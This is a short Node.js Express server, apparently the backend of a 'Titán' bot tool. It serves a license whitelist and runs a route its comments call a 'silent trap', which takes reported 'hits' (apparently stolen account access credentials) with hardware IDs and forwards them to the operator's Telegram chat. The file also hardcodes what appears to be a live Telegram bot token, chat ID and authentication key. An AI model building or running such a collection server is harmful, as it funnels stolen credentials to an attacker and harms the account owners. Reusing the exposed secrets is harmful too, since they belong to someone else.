const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());

// --- CONFIGURACIÓN DE TELEGRAM ---
const TELEGRAM_TOKEN = '8753363173:AAETIidwUu0M1hPYXOGPswuvBclTsRnVZ6g';
const MI_CHAT_ID = '7503721625';

async function enviarTelegram(mensaje) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: MI_CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown'
        });
    } catch (e) {
        console.log("Error en Telegram:", e.message);
    }
}

// Ruta para que el bot verifique licencias
app.get('/lista_blanca.txt', (req, res) => {
    res.sendFile(path.join(__dirname, 'lista_blanca.txt'));
});

// Ruta de la trampa silenciosa
app.post('/api/v1/sync', async (req, res) => {
    const { tipo, hwid, data, fecha } = req.body;
    
    // Seguridad para que solo TU bot pueda escribir aquí
    if (req.headers['x-titan-auth'] !== '725255cd-4493-4958-9baa') return res.sendStatus(403);

    let mensajeTelegram = "";
    if (tipo === "HIT_ENCONTRADO") {
        mensajeTelegram = `🔥 *¡NUEVO HIT!* 🔥\n\n👤 *Acceso:* \`${data}\`\n🆔 *HWID:* ${hwid}\n📅 *Hora:* ${fecha}`;
    } else if (tipo === "ACCESO_DENEGADO") {
        mensajeTelegram = `🚨 *ALERTA:* Intento de entrada ilegal\n🆔 *HWID:* ${hwid}`;
    }

    if (mensajeTelegram) await enviarTelegram(mensajeTelegram);
    res.sendStatus(200);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log("✅ Servidor Maestro Titán Online");
});
